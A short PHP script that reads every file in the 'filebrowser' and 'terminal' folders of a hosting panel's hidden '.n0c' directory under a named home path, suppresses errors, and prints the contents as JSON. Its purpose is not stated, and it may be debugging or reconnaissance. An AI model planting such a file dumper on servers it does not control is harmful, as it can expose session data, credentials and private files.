<?php
$out = [];
$n0c = '/home/atqadcksav/.n0c';

foreach (['filebrowser', 'terminal'] as $sub) {
    $d = "$n0c/$sub";
    $scan = @scandir($d) ?: [];
    $out[$sub]['files'] = $scan;
    foreach ($scan as $f) {
        if ($f === '.' || $f === '..') continue;
        $fp = "$d/$f";
        if (@is_file($fp)) {
            $out[$sub]['content'][$f] = @file_get_contents($fp);
        } elseif (@is_dir($fp)) {
            $out[$sub]['subdir'][$f] = @scandir($fp) ?: [];
        }
    }
}

echo json_encode($out, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
